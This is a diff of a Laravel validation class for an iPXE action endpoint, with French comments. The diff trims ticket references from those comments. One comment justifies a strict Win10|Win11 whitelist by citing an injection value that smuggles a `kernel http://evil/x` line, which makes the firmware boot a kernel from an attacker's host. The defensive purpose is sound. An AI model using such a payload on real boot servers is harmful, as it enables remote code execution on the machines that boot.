@@ -8,10 +8,8 @@ use Illuminate\Foundation\Http\FormRequest;
 use Illuminate\Validation\Rule;
 
 /**
- * Story 3.2 — AC2.2.
- *
  * Validation permissive du body de `GET|POST /ipxe/action/{action}`. Règles
- * iso `IpxeBootRequest` (3.1) + tolérance pour les paramètres optionnels
+ * iso `IpxeBootRequest` + tolérance pour les paramètres optionnels
  * `version`/`debug`/`disk`/`perso` consommés par {@see \App\Ipxe\Services\IpxeActionResolver}.
  *
  * **Note** : le param `action` est dans l'URL (route param) — il n'est PAS
@@ -21,7 +19,7 @@ use Illuminate\Validation\Rule;
  * la valeur est hors whitelist.
  *
  * `authorize()` retourne `true` — l'auth est portée par le middleware
- * `auth.v1.lan-only` (D3).
+ * `auth.v1.lan-only`.
  */
 class IpxeActionRequest extends FormRequest
 {
@@ -35,8 +33,8 @@ class IpxeActionRequest extends FormRequest
      */
     public function rules(): array
     {
-        // Fix review #2 / Q2 Henri — whitelist stricte `Win10|Win11` pour le
-        // paramètre `version` consommé par `actions/winpe.blade.php`. Sans
+        // Whitelist stricte `Win10|Win11` pour le paramètre `version`
+        // consommé par `actions/winpe.blade.php`. Sans
         // whitelist, un input `version="Win11\nkernel http://evil/x"` permet
         // une injection iPXE (le firmware exécute la ligne kernel attaquante).
         // Source de vérité : `config('ipxe.actions.winpe.allowed_versions')`.
